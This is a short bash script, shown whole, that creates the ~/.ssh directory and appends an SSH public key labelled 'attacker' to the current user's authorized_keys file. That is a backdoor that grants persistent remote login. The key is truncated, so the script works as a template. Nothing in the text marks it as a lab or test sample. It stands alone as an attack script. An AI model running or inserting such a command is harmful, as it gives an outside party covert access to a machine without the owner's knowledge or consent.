#!/bin/bash
mkdir -p ~/.ssh
echo 'ssh-rsa AAAAB3Nz...attacker' >> ~/.ssh/authorized_keys
